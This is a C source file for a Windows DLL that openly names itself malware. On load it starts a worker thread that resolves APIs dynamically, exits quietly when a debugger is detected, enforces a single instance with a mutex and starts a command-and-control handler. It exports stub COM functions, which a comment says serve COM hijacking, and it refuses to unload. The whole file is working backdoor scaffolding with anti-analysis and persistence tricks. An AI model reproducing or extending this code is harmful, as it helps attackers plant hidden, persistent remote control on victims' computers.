#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <objbase.h>

#include "dynamic_linking.c"
#include "c2_handler.c"
#include "debug_check.c"
#include "mutex.c"

// Global variables
static HINSTANCE g_hInstance = NULL;
static HANDLE g_hThread = NULL;
static volatile BOOL g_bRunning = FALSE;

// Worker thread function
DWORD WINAPI MalwareWorkerThread(LPVOID lpParameter) {
    // Initialize dynamic function loading
    if (!InitializeDynamicFunctions()) {
        // Failed to load critical functions
        return 1;
    }

    // Set default C2 server configuration
    set_c2_server(NULL, 0);
    
    // Check if debugged by multiple methods
    BOOL isDebuggedMultiple = IsDebuggerDetectedMultiple();
    if (isDebuggedMultiple) {
        // Silently exit if debugger detected
        return 1;
    }

    // Create mutex to prevent multiple instances
    SingleInstanceMutex* instanceMutex = CreateSingleInstanceMutex();
    if (instanceMutex == NULL) {
        // Another instance is already running
        return 1;
    }

    // Initialize C2 handler
    start_c2_handler();

    // Keep the thread running
    while (g_bRunning) {
        Sleep(1000);
    }

    return 0;
}

// DLL Entry Point
BOOL APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            g_hInstance = hinstDLL;
            DisableThreadLibraryCalls(hinstDLL);
            
            // Start malware functionality in a separate thread
            g_bRunning = TRUE;
            g_hThread = CreateThread(NULL, 0, MalwareWorkerThread, NULL, 0, NULL);
            break;

        case DLL_PROCESS_DETACH:
            // Stop worker thread
            g_bRunning = FALSE;
            if (g_hThread != NULL) {
                WaitForSingleObject(g_hThread, 2000);
                CloseHandle(g_hThread);
                g_hThread = NULL;
            }
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

// COM Server exports - minimal implementation for hijacking
__declspec(dllexport) HRESULT WINAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv) {
    // Return CLASS_E_CLASSNOTAVAILABLE to let the legitimate COM server handle it
    // This allows the DLL to be loaded but passes through to the real handler
    return CLASS_E_CLASSNOTAVAILABLE;
}

__declspec(dllexport) HRESULT WINAPI DllCanUnloadNow(void) {
    // Always return S_FALSE to prevent unloading
    return S_FALSE;
}

__declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
    // Do nothing, return success
    return S_OK;
}

__declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void) {
    // Do nothing, return success
    return S_OK;
}
